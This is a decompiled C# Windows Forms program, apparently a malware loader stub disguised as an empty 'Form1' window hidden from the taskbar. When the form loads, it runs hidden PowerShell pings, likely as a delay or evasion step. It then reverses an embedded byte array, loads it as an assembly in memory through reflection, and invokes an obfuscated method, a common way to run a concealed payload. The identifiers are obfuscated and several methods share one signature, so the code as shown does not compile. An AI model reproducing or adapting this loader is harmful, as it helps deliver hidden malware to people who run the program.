using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace WindowsFormsApp25;

public sealed class a : Form
{
	private IContainer m_a;

	public a()
	{
		b();
	}

	private void a(object sender, EventArgs e)
	{
		this.a();
		((Form)this).set_ShowInTaskbar(this.a());
	}

	private MemoryStream a()
	{
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			byte[] array = c.a();
			Array.Reverse((Array)array, 0, array.Length);
			memoryStream.Write(array, 0, array.Length);
			return memoryStream;
		}
		finally
		{
			((IDisposable)memoryStream).Dispose();
		}
	}

	private Assembly a()
	{
		return (Assembly)typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) })!.Invoke(0, new object[1] { this.a().ToArray() });
	}

	private MethodInfo a()
	{
		MethodInfo[] methods = this.a().GetType("NpAZeOpr8ZWwVMhTJ0.QpR2biVw9yq1KNsMk1")!.GetMethods();
		int num = 0;
		MethodInfo methodInfo;
		while (true)
		{
			if (num < methods.Length)
			{
				methodInfo = methods[num];
				if (methodInfo.Name == "OiBbIZVoV")
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return methodInfo;
	}

	private void a()
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Test-Connection www.yahoo.com",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			})!.WaitForExit();
			Process.Start(new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Test-Connection www.bing.com",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			})!.WaitForExit();
		}
		catch
		{
		}
	}

	private bool a()
	{
		if ((bool)this.a().Invoke(null, null))
		{
			return true;
		}
		return false;
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		((Form)this).Dispose(a);
	}

	private void b()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(770, 393));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
